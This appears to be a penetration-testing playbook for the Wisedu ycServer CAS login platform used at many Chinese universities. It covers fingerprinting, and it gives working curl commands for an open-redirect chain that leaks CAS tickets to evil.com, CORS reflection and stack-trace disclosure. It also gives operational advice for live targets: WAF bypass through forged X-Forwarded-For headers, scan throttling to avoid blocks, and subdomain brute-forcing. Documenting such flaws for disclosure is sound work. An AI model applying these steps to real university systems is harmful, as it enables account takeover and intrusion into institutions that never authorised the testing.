# CAS ycServer (金智教育) SSO Vulnerability Patterns

Product: **ycServer 赢领身份认证平台 (IDS)** by 金智教育 (Wisedu) — used by hundreds of Chinese universities.
Framework: Spring Boot + Spring WebFlow + Apache Tomcat + openresty/nginx reverse proxy.

## Fingerprinting

- Theme path: `/authserver/<schoolTheme>/static/` (e.g. `gxdlxydTheme8`)
- Login JS: `/authserver/<theme>/static/web/js/login.js`
- Common JS files: `encrypt.js` (CryptoJS), `common-header.js`, `utils.js`, `login.js`, `qrcode.js`, `schoolCombinedLogin.js`, `fido.js`
- Cookie: `_vesi=<md5>` (Path=/), `route=<hex>` (Path=/authserver), `JSESSIONID=<hex>` (Path=/authserver)
- Default CSS: `toastr.min.css`, `login.css`, `fido.css`, `swiper.min.css`
- Version leak: comment in `common-header.js` — e.g. `// 7.2.1.SP4从window.onload移入`

## Key JS Variables (login.js)

```javascript
var DEFAULT_SALT = "<16-char>";        // hardcoded password encryption salt
var QR_LOGIN_ENABLED = 0|1;            // QR code login toggle
var captchaSwitch = "1"|"2";           // 1=image captcha, 2=slider captcha
var _badCredentialsCount = "5";        // lockout threshold
var contextPath = "/authserver";
```

Per-session salt in hidden field: `<input id="pwdEncryptSalt" value="<16-char>" />`
Password encryption: `encryptPassword(password, pwdEncryptSalt)` using CryptoJS (AES-CBC with PKCS7).

## Confirmed Vulnerability Patterns

### 1. CAS Open Redirect via service parameter (中危)

CAS login accepts `service` parameter with nested callback URLs. The callback's `url` parameter is not whitelisted.

**Attack chain**:
```
https://ids.school.edu/authserver/login?service=https%3A%2F%2Fvpn.school.edu%2Fusers%2Fauth%2Fcas%2Fcallback%3Furl%3Dhttps%253A%252F%252Fevil.com
```
- User sees legitimate CAS login page (school domain)
- After login, CAS ticket sent to callback with evil.com redirect
- Attacker captures ticket → impersonates user

**Verification**:
```bash
curl -sk 'https://ids.school.edu/authserver/login?service=https%3A%2F%2Fvpn.school.edu%2Fusers%2Fauth%2Fcas%2Fcallback%3Furl%3Dhttps%253A%252F%252Fevil.com' | grep 'var service'
# Should show: var service = ["...callback?url=https%3A%2F%2Fevil.com"];
```

### 2. CAS Logout Open Redirect via goto parameter (中危)

Logout page reflects `goto` parameter into JavaScript, used to construct re-login link.

**Code path** (`/authserver/logout?goto=<URL>`):
```javascript
var goto = "<URL>";  // reflected from URL param
service = goto;
$("#logoutA").attr("href", "/authserver/logout?service=" + encodeURIComponent(service));
```

**Verification**:
```bash
curl -sk 'https://ids.school.edu/authserver/logout?goto=https://evil.com' | grep 'var goto'
# Output: var goto = "https://evil.com"
```

**Note**: `javascript:` URIs are also reflected (e.g. `goto=javascript:alert(1)`) but `encodeURIComponent` encodes the colon, so direct XSS via href is blocked. `data:` URIs are filtered.

### 3. CORS Misconfiguration — Preflight Reflection (中危)

The `CorsFilter` (com.wisedu.minos.config.filter.CorsFilter) reflects any Origin on OPTIONS preflight responses.

**Verification**:
```bash
curl -sk -X OPTIONS \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: Content-Type, Authorization' \
  'https://ids.school.edu/authserver/tenant/info' -I
# Response: access-control-allow-origin: https://evil.com
#           access-control-allow-credentials: true
```

**Scope**: All CAS endpoints return CORS headers on OPTIONS. Actual GET/POST responses do NOT return CORS headers — limits exploitability but still a security issue.

### 4. Spring Boot Stack Trace Disclosure (中危)

Invalid `execution` key triggers HTTP 500 with full Java stack trace (JSON format).

**Trigger**:
```bash
curl -sk -X POST 'https://ids.school.edu/authserver/login?service=...' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=test&password=test&_eventId=submit&cllt=userNameLogin&dllt=generalLogin&execution=AAAA&lt='
```

**Response** (11KB JSON):
```json
{
  "status": 500,
  "exception": "org.springframework.webflow.execution.repository.BadlyFormattedFlowExecutionKeyException",
  "message": "Badly formatted flow execution key 'AAAA', the expected format is '<uuid>_<base64-encoded-flow-state>'",
  "trace": "full stack trace with class names, line numbers, filter chain..."
}
```

**Key info leaked in trace**:
- `com.wisedu.minos.config.filter.CorsFilter` — CORS vulnerability root cause
- `com.wisedu.minos.config.filter.CloudSecurityFilter`
- `com.wisedu.minos.config.filter.LoginSecurityUrlFilter`
- `com.wisedu.minos.config.filter.RestApiSecurityIpFilter`
- `com.wisedu.minos.gateway.client.filter.SecurityFilter`
- `org.apereo.cas.*` — CAS framework classes
- `org.springframework.cloud.*` — Spring Cloud components

### 5. Hardcoded DEFAULT_SALT in login.js (低危)

`login.js` contains `var DEFAULT_SALT = "<16-char-hex>"` — hardcoded password encryption salt. Per-session `pwdEncryptSalt` is also in hidden field.

## Exposed API Endpoints (ycServer .htl)

| Path | Purpose | Notes |
|------|---------|-------|
| `/authserver/login` | CAS login page | Reflects `type` param in JS (`var type = [...]`) |
| `/authserver/logout` | CAS logout | Reflects `goto` param |
| `/authserver/serviceValidate` | CAS ticket validation | Yale CAS XML protocol |
| `/authserver/proxyValidate` | CAS proxy validation | Same as above |
| `/authserver/p3/serviceValidate` | CAS 3.0 validation | Same |
| `/authserver/samlValidate` | SAML 1.0 validation | POST only (405 on GET), requires `service` + `ticket` |
| `/authserver/v1/tickets` | CAS REST API | Returns 401: "非对外接口不允许直接访问" |
| `/authserver/tenant/info` | School config JSON | Unauthenticated: theme name, logo URLs, OSS paths |
| `/authserver/qrCode/getToken` | QR login token | Returns `QR-<random>` token |
| `/authserver/qrCode/getCode?uuid=` | QR code image | Returns PNG image |
| `/authserver/qrCode/getStatus.htl` | QR scan status | 0=unscanned, 1=scanned, 3=invalid |
| `/authserver/checkNeedCaptcha.htl` | Captcha check | Always returns `{"isNeed":false}` (misconfigured) |
| `/authserver/getCaptcha.htl` | Captcha image | Returns JPEG (80x30px) |
| `/authserver/dynamicCode/getDynamicCode.htl` | SMS code | Requires captcha despite checkNeedCaptcha=false |

## Testing Methodology

### Phase 1: Fingerprint
1. Resolve DNS → identify CAS host (often `ids.<domain>` or `ids.vpn.<domain>`)
2. Check `/authserver/login` → confirm ycServer (theme path, JS files)
3. Extract version from `common-header.js` comments
4. Extract `DEFAULT_SALT` and session config from `login.js`

### Phase 2: Parameter Reflection
Test all URL parameters on CAS pages for reflection:
- `service`, `goto`, `type`, `display`, `cllt`, `dllt`, `model`, `theme`
- Check if reflected in JS context (potential XSS) or as URL redirect target

### Phase 3: CORS Testing
```bash
# Preflight test on multiple endpoints
for path in /authserver/login /authserver/tenant/info /authserver/serviceValidate; do
  curl -sk -X OPTIONS -H 'Origin: https://evil.com' \
    -H 'Access-Control-Request-Method: POST' \
    "https://ids.school.edu$path" -I 2>/dev/null | grep -i 'access-control'
done
```

### Phase 4: Error Disclosure
```bash
# Trigger stack trace via invalid execution key
curl -sk -X POST 'https://ids.school.edu/authserver/login?service=...' \
  -d 'username=test&password=test&_eventId=submit&cllt=userNameLogin&dllt=generalLogin&execution=AAAA&lt='
```

### Phase 5: Open Redirect Chains
Test service parameter nesting:
1. Direct: `?service=https://evil.com`
2. Nested callback: `?service=https://vpn.school.edu/callback?url=https://evil.com`
3. Logout goto: `/logout?goto=https://evil.com`

## WAF Bypass Techniques (Chinese University Sites)

- `X-Forwarded-For: 127.0.0.1` or `X-Real-IP: 127.0.0.1` can temporarily bypass WAF on some Chinese university sites
- Works inconsistently — WAF may catch on after heavy scanning
- Useful for initial access to blocked college subdomain sites (VSB9/JSP sites behind rums/b proxy)
- After bypass, follow HTTP→HTTPS redirects normally

## Pitfalls

- **WAF false positives**: Many Chinese university WAFs return HTTP 200 with "访问禁止" block page for sensitive paths (`.git`, `.sql`, `swagger`). Always verify actual content, don't trust status code alone.
- **WAF rate limiting**: After heavy scanning, WAFs may block your IP entirely (empty responses). Slow down and use longer delays between requests.
- **checkNeedCaptcha always false**: This is a misconfiguration, not a bypass — the SMS endpoint still requires captcha server-side.
- **CORS only on OPTIONS**: The CorsFilter only adds headers to preflight responses, not actual requests. This limits but doesn't eliminate the vulnerability.
- **QR login disabled**: `QR_LOGIN_ENABLED = 0` in JS means frontend QR is disabled, but backend endpoints (`/qrCode/*`) still exist and respond.
- **execution key is one-time**: Each CAS login page load generates a unique execution key. Invalid keys trigger 500 stack trace, valid keys are consumed after use.
- **execution key is JWT HS512**: Format is `<uuid>_<base64-encoded-JWT>`. JWT header: `{"alg":"HS512"}`. Cannot forge without signing key — Apereo CAS validates the algorithm strictly. Don't waste time on `alg:none` or key-confusion attacks.
- **WAF returns 200 for blocked requests**: Chinese university WAFs (e.g. rums/b reverse proxy) return HTTP 200 with "访问禁止" HTML body for sensitive paths (`.git`, `.sql`, `swagger`, etc.). Automated scanners (nuclei, dirb, nmap) see 200 and report false positives. Always grep response body for `访问禁止` or `检测到可疑访问` to filter WAF blocks.
- **WAF bypass via X-Forwarded-For**: Some Chinese university WAFs can be temporarily bypassed by adding `X-Forwarded-For: 127.0.0.1` or `X-Real-IP: 127.0.0.1` headers. Works inconsistently — WAF may catch on after heavy scanning. Useful for initial access to blocked college subdomain sites.
- **College subdomain pattern**: Chinese universities typically have 10-20 subdomains for each college/department (e.g. `dlgc.school.edu` for 电力工程学院, `jz.school.edu` for 建筑工程学院). These often run older CMS (VSB9/JSP) with weaker security. DNS brute force with Chinese college abbreviations is productive.
- **`javascript:` in goto**: Reflected in JS but `encodeURIComponent` encodes the colon, preventing direct XSS via href. Report as parameter injection, not XSS.
